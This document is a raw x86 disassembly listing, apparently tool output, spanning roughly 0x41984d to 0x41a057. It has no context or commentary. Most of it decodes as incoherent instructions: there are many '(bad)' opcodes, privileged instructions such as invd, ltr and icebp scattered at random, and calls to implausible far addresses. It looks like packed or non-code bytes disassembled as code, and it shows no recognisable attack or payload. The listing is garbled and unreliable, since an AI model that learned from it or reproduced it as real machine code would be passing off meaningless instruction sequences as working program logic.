  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
  419fef:	inc    eax
  419ff1:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  419ff5:	or     ah,bh
  419ff7:	inc    eax
  419ff8:	push   ebp
  419ff9:	jmp    0x41a04c
  419ffb:	mov    eax,DWORD PTR ds:0xe8720c
  41a001:	mov    DWORD PTR [ebp-0x8],eax
  41a004:	jne    0x41a04b
  41a006:	jmp    0x419f93
  41a008:	mov    ebp,DWORD PTR [eax]
  41a00a:	clc    
  41a00b:	retf   0xff55
  41a00e:	push   ecx
  41a00f:	mov    DWORD PTR ds:0x757210,eax
  41a015:	mov    ecx,DWORD PTR [ebp-0x4]
  41a018:	sub    esp,DWORD PTR [ebx-0x77]
  41a01b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41a022:	or     ah,bh
  41a024:	pop    es
  41a025:	ds pushf 
  41a027:	push   DWORD PTR [edx]
  41a029:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41a02f:	(bad)  
  41a030:	mov    bh,bh
  41a032:	jmp    0x41a020
  41a034:	leave  
  41a035:	jne    0x41a03f
  41a037:	call   0x2e9991
  41a03c:	in     al,dx
  41a03d:	dec    ebp
  41a03e:	add    dh,BYTE PTR [ebx]
  41a040:	add    BYTE PTR [ebx],al
  41a042:	inc    ebp
  41a043:	cmp    esi,DWORD PTR [ecx]
  41a045:	je     0x419fe3
  41a047:	mov    eax,edi
  41a049:	or     al,0xf0
  41a04b:	add    BYTE PTR [ebp+0x458bf845],al
  41a051:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  41a057:	adc    al,0x7
